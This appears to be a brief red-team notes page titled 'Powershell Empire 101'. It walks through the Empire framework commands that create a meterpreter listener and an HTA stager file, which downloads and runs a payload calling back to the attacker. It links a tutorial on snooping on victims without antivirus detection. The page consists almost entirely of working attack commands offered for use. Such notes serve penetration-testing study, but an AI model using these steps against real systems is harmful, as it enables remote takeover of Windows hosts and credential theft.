# Powershell Empire 101

## Listener

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
// Empire commands used
?
uselistener meterpreter
info
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/empire-listener.png)

Starting the listener:

```text
execute
```

![](../.gitbook/assets/empire-startlistener.png)

## Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```csharp
//specify what stager to use
usestager windows/hta

//associate stager with the meterpreter listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/empire-stager.png)



{% embed data="{\"url\":\"https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/\",\"type\":\"link\",\"title\":\"How to Use PowerShell Empire: Getting Started with Post-Exploitation of Windows Hosts\",\"description\":\"PowerShell Empire is a post-exploitation framework for computers and servers running Microsoft Windows, Windows Server operating systems, or both. In these tutorials, we will be exploring everything from how to install Powershell Empire to how to snoop around a victim\'s computer without the antivirus software knowing about it. If we are lucky, we might even be able to obtain domain administrator credentials and own the whole network. A Tool for Targeting Windows Exploit frameworks are popular, and most hackers have heard of Metasploit, a framework that automates the deployment of powerful\",\"icon\":{\"type\":\"icon\",\"url\":\"https://img.wonderhowto.com/images/favicons/wonderhowto/favicon-194x194.png\",\"width\":194,\"height\":194,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://img.wonderhowto.com/img/85/10/63638593407829/0/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts.1280x600.jpg\",\"width\":1280,\"height\":600,\"aspectRatio\":0.46875}}" %}

